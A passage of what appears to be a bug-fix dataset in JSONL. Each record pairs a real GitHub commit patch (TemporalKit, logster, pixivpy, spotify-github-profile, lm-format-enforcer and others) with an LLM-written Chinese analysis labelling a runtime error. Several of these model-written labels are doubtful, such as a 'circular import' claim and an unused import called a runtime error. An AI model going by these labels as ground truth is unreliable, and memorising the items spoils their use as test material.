sqlkw[\"max_overflow\"] = 0\n         if \"mysql\" in self.driver:", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "python3_urlparse_import", "bug_description": "buggy_code 使用了 Python 2 风格的 urlparse 导入方式，在 Python 3 中会抛出 ImportError。fixed_code 添加了兼容性导入，在 Python 2 和 Python 3 中都能正常工作。"}}}
{"id": "bugfix040", "buggy_file": "data/raw_new/bugfix040_buggy.py", "fixed_file": "data/raw_new/bugfix040_fixed.py", "meta": {"repo": "CiaraStrawberry/TemporalKit", "file": "scripts/Ebsynth_Processing.py", "buggy_sha": "8f1814a48d58c56b317f1ef461390c6d96596c3c", "fixed_sha": "a1f61ee0698558d963854c5f2d499cf51427d125", "commit_message": "absurd number of bug fixes", "changes": 26, "patch": "@@ -118,7 +118,7 @@ def recombine (video_path, fps, per_side, batch_size, fillindenoise, edgedenoise\n \n \n \n-def crossfade_folder_of_folders(output_folder, fps):\n+def crossfade_folder_of_folders(output_folder, fps,return_generated_video_path=False):\n     \"\"\"Crossfade between images in a folder of folders and save the results.\"\"\"\n     root_folder = output_folder\n     all_dirs = [d for d in os.listdir(root_folder) if os.path.isdir(os.path.join(root_folder, d))]\n@@ -152,7 +152,7 @@ def crossfade_folder_of_folders(output_folder, fps):\n \n \n \n-        for j in range(keynum, len(images_current)):\n+        for j in range(keynum, len(images_current) - 1):\n             alpha = (j - keynum) / (len(images_current) - keynum)\n             image1_path = os.path.join(current_dir, images_current[j])\n             next_image_index = j - keynum if j - keynum < len(images_next) else len(images_next) - 1\n@@ -166,20 +166,24 @@ def crossfade_folder_of_folders(output_folder, fps):\n             # blended_image.save(os.path.join(output_folder, f\"{dirs[i]}_{dirs[i+1]}_crossfade_{j:04}.png\"))\n \n     final_dir = os.path.join(root_folder, dirs[-1])\n-    for c in range(allkeynums[-1], len(final_dir)):\n-        \n-        images_final = sorted(os.listdir(final_dir))\n-        if c >= len(images_final):\n-            break\n-        image1_path = os.path.join(final_dir, images_final[c])\n+    final_dir_images = sorted(os.listdir(final_dir))\n+    start_point = len(final_dir_images) // 2\n+    print(f\"going from dir {start_point} to end at {len(final_dir_images)}\")\n+\n+    for c in range(start_point, len(final_dir_images)):\n+        image1_path = os.path.join(final_dir, final_dir_images[c])\n         image1 = Image.open(image1_path)\n         output_images.append(np.array(image1))\n-    \n-\n+        \n \n+    print (f\"outputting {len(output_images)} images\")\n     output_save_location = os.path.join(output_folder, \"crossfade.mp4\")\n     generated_vid = extensions.TemporalKit.scripts.berry_utility.pil_images_to_video(output_images, output_save_location, fps)\n-    return generated_vid\n+     \n+    if return_generated_video_path == True:\n+        return generated_vid\n+    else: \n+        return output_images\n \n def getkeynums (folder_path):\n     filenames = os.listdir(folder_path)", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "index_out_of_range_in_crossfade", "bug_description": "在 crossfade_folder_of_folders 函数中，buggy_code 存在两个问题：1) 在循环处理最后一个目录时，使用 len(final_dir) 而不是 len(images_final) 会导致索引越界错误；2) 在交叉淡入淡出循环中，j 的范围包括 len(images_current)，这会导致索引超出范围。fixed_code 修复了这些问题：将循环范围改为 len(images_current)-1 避免越界，并正确计算最后一个目录的起始点。"}}}
{"id": "bugfix041", "buggy_file": "data/raw_new/bugfix041_buggy.py", "fixed_file": "data/raw_new/bugfix041_fixed.py", "meta": {"repo": "CiaraStrawberry/TemporalKit", "file": "scripts/optical_flow_raft.py", "buggy_sha": "3dbcb0d9f86f745acbb619f568ca25fe1a5112b7", "fixed_sha": "2d57062d6ea0b3e9775dd7c001a901c65ff35b55", "commit_message": "Merge pull request #3 from camenduru/install\n\nfixes from @jinnsp and @camenduru  ❤", "changes": 21, "patch": "@@ -15,7 +15,6 @@\n import tempfile\n from pathlib import Path\n from urllib.request import urlretrieve\n-import tensorflow as tf\n from scipy.interpolate import LinearNDInterpolator\n from imageio import imread, imwrite\n from torchvision.utils import flow_to_image\n@@ -182,26 +181,6 @@ def warp_image(image, flow):\n     warped_image = cv2.remap(image, flow_map, None, cv2.INTER_LANCZOS4)\n     return warped_image\n \n-\n-def raft_flow_to_apply_v2(flow,image):\n-\n-\n-    # Squeeze the flow array to remove the first dimension\n-    flow_array = tf.squeeze(flow, axis=0)\n-    flow_array = np.transpose(flow_array, (1, 2, 0))\n-    # Normalize flow_array to the range [0, 1]\n-    image_float = tf.cast(image, dtype=tf.float32)\n-\n-    # Warp the image using the flow map\n-    warped_image = tf.image.dense_image_warp(image_float, flow_array)\n-\n-    # Convert the warped_image tensor back to uint8\n-    warped_image_uint8 = tf.cast(warped_image, dtype=tf.uint8)\n-\n-    return warped_image_uint8\n-\n-\n-\n def save_image(image, file_path):\n     cv2.imwrite(file_path, image)\n ", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "unused_tensorflow_import_and_function", "bug_description": "buggy_code 导入了 tensorflow 但从未使用，并且包含一个未使用的函数 raft_flow_to_apply_v2。这会导致运行时错误，因为代码依赖 tensorflow 但实际不需要它，可能导致环境依赖问题或导入错误。fixed_code 移除了不必要的 tensorflow 导入和未使用的函数，简化了依赖关系。"}}}
{"id": "bugfix042", "buggy_file": "data/raw_new/bugfix042_buggy.py", "fixed_file": "data/raw_new/bugfix042_fixed.py", "meta": {"repo": "etsy/logster", "file": "logster/logster_helper.py", "buggy_sha": "c5d703e8f571d68e14d9c40f1fa28df1bc550678", "fixed_sha": "4290c3ecb452bd2e32473c425cb76906311897a2", "commit_message": "Fix testing on python 2.5", "changes": 6, "patch": "@@ -89,8 +89,8 @@ def get_instance_id(self, instance_id = None):\n             try:\n                 conn = HTTPConnection(\"169.254.169.254\")\n                 conn.request(\"GET\", \"/latest/meta-data/instance-id\")\n-            except Exception as e:\n-                raise CloudWatchException(\"Can't connect Amazon meta data server to get InstanceID : (%s)\" % e.message)\n+            except Exception:\n+                raise CloudWatchException(\"Can't connect Amazon meta data server to get InstanceID : (%s)\")\n \n             self.instance_id = conn.getresponse().read()\n         \n@@ -139,7 +139,7 @@ def put_data(self):\n         try:\n             conn = HTTPConnection(self.base_url)\n             conn.request(\"GET\", signedURL)\n-        except Exception as e:\n+        except Exception:\n             raise CloudWatchException(\"Can't connect Amazon CloudWatch server\") \n         res = conn.getresponse()\n ", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "exception_message_format_error", "bug_description": "在buggy_code中，当捕获到异常时，尝试使用e.message来格式化异常消息，但在Python 3中，Exception对象没有message属性，这会导致AttributeError。fixed_code移除了对e.message的引用，避免了运行时错误。"}}}
{"id": "bugfix043", "buggy_file": "data/raw_new/bugfix043_buggy.py", "fixed_file": "data/raw_new/bugfix043_fixed.py", "meta": {"repo": "upbit/pixivpy", "file": "pixivpy3/utils.py", "buggy_sha": "ecd53135f5d5f085914dd0d380be89f6f7395449", "fixed_sha": "565548aac5de20afa54afc096645d75969dc3061", "commit_message": "Merge pull request #394 from upbit/mock_tests\n\nFix workflow, use pytest (mock JSON data) replace demp.py checks", "changes": 8, "patch": "@@ -1,9 +1,13 @@\n from __future__ import annotations\n \n+import typing\n from typing import Any, Dict, Optional\n \n import requests\n-from requests.structures import CaseInsensitiveDict\n+\n+if typing.TYPE_CHECKING:\n+    from requests.structures import CaseInsensitiveDict\n+\n \n # from typeguard import typechecked\n \n@@ -21,7 +25,7 @@ def __init__(\n         reason: str,\n         header: dict[str, Any] | CaseInsensitiveDict[Any] | None = None,\n         body: str | None = None,\n-    ):\n+    ) -> None:\n         self.reason = str(reason)\n         self.header = header\n         self.body = body", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "circular_import_fix", "bug_description": "buggy_code 中存在循环导入问题，直接导入 CaseInsensitiveDict 会导致在运行时出现 ImportError。fixed_code 通过使用 typing.TYPE_CHECKING 和条件导入，将 CaseInsensitiveDict 的导入移到类型检查时，避免了循环导入导致的运行时错误。"}}}
{"id": "bugfix044", "buggy_file": "data/raw_new/bugfix044_buggy.py", "fixed_file": "data/raw_new/bugfix044_fixed.py", "meta": {"repo": "upbit/pixivpy", "file": "example_bypass_sni.py", "buggy_sha": "d144b42947a2de667e4b01b0c4f3d37e26664de1", "fixed_sha": "e3fd59064e74e86ed0302fbb92ead3b85f540208", "commit_message": "fix: Fix SniAPI host issue, upgrade requests to 2.31.0", "changes": 3, "patch": "@@ -13,7 +13,8 @@\n \n def main():\n     api = ByPassSniApi()  # Same as AppPixivAPI, but bypass the GFW\n-    api.require_appapi_hosts()\n+    # api.require_appapi_hosts()\n+    api.require_appapi_hosts(hostname=\"public-api.secure.pixiv.net\")\n     # api.set_additional_headers({'Accept-Language':'en-US'})\n     api.set_accept_language(\"en-us\")\n ", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "missing_hostname_parameter", "bug_description": "buggy_code 中调用 api.require_appapi_hosts() 时缺少必要的 hostname 参数，这会导致 pixivpy3 库无法正确配置 API 主机地址，从而在后续的 API 调用中抛出异常。fixed_code 通过添加 hostname=\"public-api.secure.pixiv.net\" 参数来正确配置 API 主机地址，确保程序能够正常运行。"}}}
{"id": "bugfix045", "buggy_file": "data/raw_new/bugfix045_buggy.py", "fixed_file": "data/raw_new/bugfix045_fixed.py", "meta": {"repo": "alfiopuglisi/guietta", "file": "setup.py", "buggy_sha": "604e8ddb0a72e4c39c526af46675c6b868475784", "fixed_sha": "9f472773771842fd7abf59a4b09e93ae585f4d23", "commit_message": "Merge pull request #43 from chinoll/master\n\nFix an exception thrown when the language of Windows is set to Chinese", "changes": 2, "patch": "@@ -17,7 +17,7 @@\n # Load the package's __version__.py module as a dictionary.\n here = os.path.abspath(os.path.dirname(__file__))\n about = {}\n-with open(os.path.join(here, NAME, '__version__.py')) as f:\n+with open(os.path.join(here, NAME, '__version__.py'),encoding='utf-8') as f:\n     exec(f.read(), about)\n \n ", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "missing_encoding_for_file_open", "bug_description": "buggy_code 在读取 __version__.py 文件时没有指定编码，当文件包含非 ASCII 字符时会导致 UnicodeDecodeError。fixed_code 添加了 encoding='utf-8' 参数来确保正确读取 UTF-8 编码的文件。"}}}
{"id": "bugfix046", "buggy_file": "data/raw_new/bugfix046_buggy.py", "fixed_file": "data/raw_new/bugfix046_fixed.py", "meta": {"repo": "kittinan/spotify-github-profile", "file": "util/firestore.py", "buggy_sha": "3548a904a48e83cbda14ae83b44c6e7d80b709b8", "fixed_sha": "7c46911bab79d0cde078cf7649adb68dfa201e7f", "commit_message": "Add giithub CI (#116)\n\n* Add unittest API view\n\n* Update README about run test\n\n* Ignore some files & folder\n\n* Setup pytest\n\n* Add dependencies about unittest uspport flask framework\n\n* Fixed handle edge case\n\n* Setup CI workflow\n\n* Add unittest API view sg\n\n* Fix for run test with mock", "changes": 7, "patch": "@@ -8,8 +8,15 @@\n \n \n def get_firestore_db():\n+    # In testing environment, return a mock client\n+    if os.getenv(\"TESTING\") == \"true\":\n+        from unittest.mock import MagicMock\n+        return MagicMock()\n+    \n     if not firebase_admin._apps:\n         firebase_config = os.getenv(\"FIREBASE\")\n+        if firebase_config is None:\n+            raise ValueError(\"FIREBASE environment variable is not set. Please set the Firebase configuration.\")\n         firebase_dict = json.loads(b64decode(firebase_config))\n \n         cred = credentials.Certificate(firebase_dict)", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "missing_environment_variable_check", "bug_description": "buggy_code 没有检查 FIREBASE 环境变量是否存在，当环境变量未设置时，json.loads(b64decode(None)) 会抛出 TypeError。fixed_code 添加了环境变量检查，如果 FIREBASE 未设置则抛出明确的 ValueError，并增加了测试环境的 mock 支持。"}}}
{"id": "bugfix047", "buggy_file": "data/raw_new/bugfix047_buggy.py", "fixed_file": "data/raw_new/bugfix047_fixed.py", "meta": {"repo": "kittinan/spotify-github-profile", "file": "api/view.py", "buggy_sha": "7740cd4e670ff51970e6c6dc43fe733a04a9629e", "fixed_sha": "3b5338284ebb673e38adfaffc9048c68bc9044b8", "commit_message": "Merge pull request #47 from kittinan/fix_bug_not_show_image\n\nfix bug not show image", "changes": 4, "patch": "@@ -21,7 +21,7 @@\n \n print(\"Starting Server\")\n \n-db = None\n+db = get_firestore_db()\n CACHE_TOKEN_INFO = {}\n \n app = Flask(__name__)\n@@ -280,5 +280,5 @@ def catch_all(path):\n \n \n if __name__ == \"__main__\":\n-    db = get_firestore_db()\n+    \n     app.run(debug=True, port=5003)", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "uninitialized_database_connection", "bug_description": "在buggy_code中，全局变量db在模块级别被初始化为None，但在get_access_token函数中尝试使用db.collection()方法，这会导致AttributeError: 'NoneType' object has no attribute 'collection'。fixed_code在模块级别正确初始化了db = get_firestore_db()，确保数据库连接在函数调用前已建立。"}}}
{"id": "bugfix048", "buggy_file": "data/raw_new/bugfix048_buggy.py", "fixed_file": "data/raw_new/bugfix048_fixed.py", "meta": {"repo": "kittinan/spotify-github-profile", "file": "api/theme_dev.py", "buggy_sha": "d015c3a10455a6e263db115e025a4e7e1fbcbd77", "fixed_sha": "16c1f5d40b157b143d95d51e55ff6e351541fc77", "commit_message": "fix: theme dev", "changes": 11, "patch": "@@ -6,7 +6,7 @@\n app = Flask(__name__)\n \n \n-def make_svg(artist_name, song_name, img, is_now_playing, cover_image, theme):\n+def make_svg(artist_name, song_name, img, is_now_playing, cover_image, theme, bar_color):\n     height = 445 if cover_image else 145\n     num_bar = 75\n \n@@ -29,12 +29,10 @@ def make_svg(artist_name, song_name, img, is_now_playing, cover_image, theme):\n         \"song_name\": song_name,\n         \"img\": img,\n         \"cover_image\": cover_image,\n+        \"bar_color\": bar_color,\n     }\n \n-    if theme != 'default':\n-      return render_template(f\"spotify.{theme}.html.j2\", **rendered_data)\n-    else:\n-      return render_template(\"spotify.html.j2\", **rendered_data)\n+    return render_template(f\"spotify.{theme}.html.j2\", **rendered_data)\n \n \n @app.route(\"/\", defaults={\"path\": \"\"})\n@@ -49,8 +47,9 @@ def catch_all(path):\n     is_now_playing = True\n     cover_image = True\n     theme = 'default'\n+    bar_color = '53b14f'\n \n-    svg = make_svg(artist_name, song_name, img, is_now_playing, cover_image, theme)\n+    svg = make_svg(artist_name, song_name, img, is_now_playing, cover_image, theme, bar_color)\n \n     resp = Response(svg, mimetype=\"image/svg+xml\")\n     resp.headers[\"Cache-Control\"] = \"s-maxage=1\"", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "missing_bar_color_parameter", "bug_description": "在buggy_code中，make_svg函数缺少bar_color参数，但模板渲染时使用了这个变量。当theme不为'default'时，模板spotify.{theme}.html.j2需要bar_color变量，但函数没有提供，会导致Jinja2模板渲染错误。修复版本添加了bar_color参数并传递给模板，同时移除了不必要的条件判断，统一使用spotify.{theme}.html.j2模板。"}}}
{"id": "bugfix049", "buggy_file": "data/raw_new/bugfix049_buggy.py", "fixed_file": "data/raw_new/bugfix049_fixed.py", "meta": {"repo": "noamgat/lm-format-enforcer", "file": "tests/common.py", "buggy_sha": "566a20ac4bff7371d31d329731c642f0831c3ffe", "fixed_sha": "ec70f018f28c14fa07f11ced2fe4cea8790e63e1", "commit_message": "v0.11.1: Bitmasks (#168)\n\n* Minor improvements for vLLM V1 engine support\n\n* Updating github action version\n\n* WIP: bitmasks\n\n* Supporting bitmasks as internal structures in token enforcer\n\n* bitmask related fixes and some performance improvments\n\n* Added documentation before next release\n\n* Enabling vLLM to set use_bitmask=True", "changes": 16, "patch": "@@ -10,7 +10,7 @@\n             \n \n _tokenizer: Optional[PreTrainedTokenizerBase] = None\n-_tokenizer_data: Optional[TokenEnforcerTokenizerData] = None\n+_tokenizer_data: dict[bool, TokenEnforcerTokenizerData] = {}\n \n \n class CharacterNotAllowedException(LMFormatEnforcerException):\n@@ -53,8 +53,11 @@ def assert_parser_with_string_token_enforcer(string: str, parser: CharacterLevel\n             logging.basicConfig(level=logging.INFO)\n             logging.warning(\"Encountered out-of-tokenizer character, LMFE does not deal with this well\")\n     \n-    if _tokenizer_data is None:\n-        _tokenizer_data = build_token_enforcer_tokenizer_data(_tokenizer)\n+    use_bitmask = len(string) % 2 == 1  # Consistent per test, varied per entire testset\n+\n+    if use_bitmask not in _tokenizer_data:\n+        _tokenizer_data[use_bitmask] = build_token_enforcer_tokenizer_data(_tokenizer, use_bitmask, len(_tokenizer))\n+    tokenizer_data = _tokenizer_data[use_bitmask]\n         \n     prompt = \"This is my question:\\n\\n\"\n     initial_token_array = _tokenizer.encode(prompt)\n@@ -67,7 +70,8 @@ def assert_parser_with_string_token_enforcer(string: str, parser: CharacterLevel\n     if not eos_token_id:\n         raise ValueError(f\"Tokenizer does not have {'an EOS token' if eos_token_id is None else 'EOS tokens'}\")\n     \n-    token_enforcer = TokenEnforcer(_tokenizer_data, parser)\n+    \n+    token_enforcer = TokenEnforcer(tokenizer_data, parser)\n     # The token enforcer is stateful - it keeps track of the parsing state as tokens arrive on a token by token basis.\n     # We simulate a language model that \"chooses\" the next token in the encoded sequence, and check that it is in the\n     # allowed list at every timestep.\n@@ -80,7 +84,7 @@ def assert_parser_with_string_token_enforcer(string: str, parser: CharacterLevel\n         allowed_tokens = token_enforcer.get_allowed_tokens(prefix)\n         if prefix_length < len(target_token_array):\n             next_token = target_token_array[prefix_length]\n-            if next_token not in allowed_tokens:\n+            if not allowed_tokens.is_token_allowed(next_token):\n                 if expect_success:\n                     decoded_before = _tokenizer.decode(prefix, skip_special_tokens=True)\n                     decoded_after = _tokenizer.decode(prefix + [next_token], skip_special_tokens=True)\n@@ -91,7 +95,7 @@ def assert_parser_with_string_token_enforcer(string: str, parser: CharacterLevel\n                     return  # Test success\n         else:\n             # Reached the end of the sequence, check that ending state matches expected ending state\n-            can_end = any(token in allowed_tokens for token in (eos_token_id if isinstance(eos_token_id, list) else [eos_token_id]))\n+            can_end = any(allowed_tokens.is_token_allowed(token) for token in (eos_token_id if isinstance(eos_token_id, list) else [eos_token_id]))\n             if can_end and not expect_success:\n                 raise ValueError(\"Parser succeeded when it should have failed\")\n             if not can_end and expect_success:", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "incorrect_token_checking_logic", "bug_description": "buggy_code 错误地使用 `next_token not in allowed_tokens` 来检查令牌是否允许，但 `allowed_tokens` 是一个对象而不是集合。fixed_code 使用正确的方法 `allowed_tokens.is_token_allowed(next_token)` 来检查令牌，避免了 AttributeError 运行时错误。"}}}
{"id": "bugfix050", "buggy_file": "data/raw_new/bugfix050_buggy.py", "fixed_file": "data/raw_new/bugfix050_fixed.py", "meta": {"repo": "noamgat/lm-format-enforcer", "file": "tests/test_tokenizercaching.py", "buggy_sha": "566a20ac4bff7371d31d329731c642f0831c3ffe", "fixed_sha": "ec70f018f28c14fa07f11ced2fe4cea8790e63e1", "commit_message": "v0.11.1: Bitmasks (#168)\n\n* Minor improvements for vLLM V1 engine support\n\n* Updating github action version\n\n* WIP: bitmasks\n\n* Supporting bitmasks as internal structures in token enforcer\n\n* bitmask related fixes and some performance improvments\n\n* Added documentation before next release\n\n* Enabling vLLM to set use_bitmask=True", "changes": 4, "patch": "@@ -3,7 +3,7 @@\n \n def test_json_freetext_cache():\n     token_to_str = {}\n-    cache = JsonFreetextTokenCache()\n+    cache = JsonFreetextTokenCache(False, 0)\n     test_length = 500\n     letters = \"abcde\"\n     num_letters = len(letters)\n@@ -19,7 +19,7 @@ def _register_token(token_str: str):\n     cache.freeze()\n \n     def _assert_allowed_tokens(_min_remaining, _max_length, _num_expected_tokens):\n-        allowed_tokens = cache.lookup_allowed_tokens(_min_remaining, _max_length)\n+        allowed_tokens = cache.lookup_allowed_tokens(_min_remaining, _max_length).allowed_tokens\n         if len(allowed_tokens) != _num_expected_tokens:\n             allowed_token_strs = \"|\".join(token_to_str[token_idx] for token_idx in allowed_tokens)\n             raise Exception(f\"Min={_min_remaining}, Max={_max_length}, Expected {_num_expected_tokens}, got {len(allowed_tokens)} : {allowed_token_strs}\")", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "attribute_error_in_lookup_allowed_tokens", "bug_description": "buggy_code 中 cache.lookup_allowed_tokens() 返回的是一个对象而不是直接的 token 列表，直接使用会导致 AttributeError。fixed_code 通过添加 .allowed_tokens 属性访问来正确获取 token 列表。"}}}
